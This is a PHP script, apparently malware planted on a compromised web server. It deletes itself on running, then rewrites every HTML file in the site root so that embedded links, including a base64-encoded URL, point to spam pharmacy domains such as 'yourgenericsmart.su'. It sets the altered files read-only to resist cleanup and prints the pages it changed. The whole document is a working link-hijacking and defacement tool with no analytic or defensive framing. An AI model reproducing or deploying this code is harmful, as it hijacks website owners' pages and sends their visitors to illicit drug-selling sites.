<?php unlink(__FILE__); $root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

//echo $path . PHP_EOL;

$root = $path;

$x_domains = explode(',' ,  "newcaremarket.com,newcareshop.com,pillperclick.shop,pillscare.shop,pillsstore.shop,rxpillperclick.shop,yourrxdeliver.club");


$x_domains = explode(',' ,  "myfavrxservice.shop,mytoprxservice.shop,pillperclick.shop,pillscare.shop,pillsstore.shop,rxpillperclick.shop,yourrxdeliver.club");
//$x_domains = explode(',' ,  "myfavrxservice.shop");
$x_domains = explode(',' ,  "yourgenericsmart.su");

$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;

foreach(glob($root . '/*.html') as $fname) {
//   echo $fname . PHP_EOL;


$replace_link = 'http://' . $x_domains[array_rand($x_domains)] . '/';
$orig_body = File_get_contents($fname);



$string = $orig_body;

$variant = 'aHR0cDovL3RvcGxpZmUudG9w';

if (strpos($string, $variant) !== false) {

$string = str_replace( $variant, base64_encode($replace_link) , $string );

//echo $fname . PHP_EOL;
//echo $string . PHP_EOL;
//break;
}

preg_match_all('#(\w*://|www\.)[a-z0-9]+(-+[a-z0-9]+)*(\.[a-z0-9]+(-+[a-z0-9]+)*)+(/([^\s()<>;]+\w)?/?)?#i', $string, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
foreach (array_reverse($matches) as $match) {
$links_replaced++;
  $a = '<a href="'.(strpos($match[1][0], '/') ? '' : 'http://') . $match[0][0].'">' . $match[0][0] . '</a>';
  $string = substr_replace($string, $replace_link, $match[0][1], strlen($match[0][0]));
}

$changed_body = $string;

if (strlen($changed_body)>5) {
$files_changed++;
//echo  'INDEX.PHP PATCHED--1111111' . PHP_EOL;

$filepath=$fname;
$basename = preg_replace('/^.+[\\\\\\/]/', '', $filepath);
//echo $basename;

if (strpos($string, $replace_link) !== false) {  echo $shell_url . '/' . $basename . PHP_EOL;  }
//echo  $changed_body . PHP_EOL . PHP_EOL;
//break;

chmod($fname, 0644);

file_put_contents($fname, $changed_body);
$fp = fopen($fname , 'w');
fwrite($fp, $changed_body);
fclose($fp);
chmod($fname, 0444);
}


}



//echo 'Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 
echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 

